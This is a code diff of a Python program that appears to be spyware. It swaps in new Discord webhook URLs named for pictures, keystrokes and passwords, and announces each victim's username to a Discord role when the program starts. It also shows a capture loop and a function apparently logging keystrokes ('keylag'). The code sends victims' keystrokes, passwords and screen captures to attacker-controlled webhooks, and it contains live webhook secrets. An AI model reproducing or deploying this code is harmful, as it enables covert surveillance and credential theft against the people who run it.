@@ -12,10 +12,10 @@ for i in range(2):
         subprocess.run(["pip","install","pyshortcuts"])
         subprocess.run(["pip","install","discord_webhook"])
 chats = ''
-pichook = 'https://discord.com/api/webhooks/1042421205753409577/3cvblLpLnsRq3fwDiSDJuImS2FhJd5xSSjxkdQpI66mEglAH9V0RV74biT5VCL4CfUvX'
-pinghook = 'https://discord.com/api/webhooks/1048263189906870336/cnKpzy1sv5tpkvJ-8gw-7AoOjKK2BLXHeweC7MpJsAEaOv1MdznNYhxL6IR7c6-nda4f'
-keyhook = "https://discord.com/api/webhooks/1048237133300772934/itwhC056-7GtFQz6G-pZSlDtgPcWvRp0uGac-RYPaDER83IuWVd9irep4lLs2A1Ziiav"
-passhook = 'https://discord.com/api/webhooks/1048271445274398791/dgxXytoLoHQYf0S3VV1He_FIUPynB8B9itBcQq_WOfJLyHs_0i87gTVjCIBnbYq3Dcbz'
+pichook = 'https://discord.com/api/webhooks/1048313483227303987/Tc2zTnlNOlyDlcnW3JngqqSVL9PsuO5AT6CTOfWCzs1Jaf246z9N-lKPkkClgAe2b841'
+pinghook = 'https://discord.com/api/webhooks/1048321898280398890/y9FByrN2zrXhaAN2c6mhYYHIrLouLJ-8pLUZAwzP56QQze1EDRWFZx3ZcK13va9qAvLn'
+keyhook = 'https://discord.com/api/webhooks/1048322117516656780/f98ZO3WcghPWgXQpijUSHVr0G8xG-7DrxkstrgBhDvcN6SPDN96CjTlNrKyjHXzror9E'
+passhook = 'https://discord.com/api/webhooks/1048322208109428796/hQ3bm18HzZfg9-qJX1DXsOJWUMo8aqoEELHaWcrtQlWYjlDcKuFsfJbx1KY7hf2BweVY'
 
 def spiderman():
     global pichook
@@ -55,7 +55,7 @@ def spiderman():
         nopp = True
 
     thehook = pichook
-    pingus = DiscordWebhook(url=pinghook, content=f'Hello, <@820217436552167484>! {getpass.getuser()} started the program!')
+    pingus = DiscordWebhook(url=pinghook, content=f'Hello, <@&1048313691495485460>! {getpass.getuser()} started the program!')
     pingus.execute(remove_embeds=True, remove_files=True)
     webhook = DiscordWebhook(url=thehook)
     while 1:
@@ -71,13 +71,13 @@ def spiderman():
                 sleep(2)
                 print("slep")
             if stats > 0:
-                pingus.set_content(str(stats),"times not connected, but now back, <@820217436552167484>")
+                pingus.set_content(str(stats),"times not connected, but now back, <@&1048313691495485460>")
                 pingus.execute()
 
                 stats = 0
         except:
             stats += 1
-        sleep(0)
+        sleep(0.5)
 def keylag():
     global chats
     global keyhook
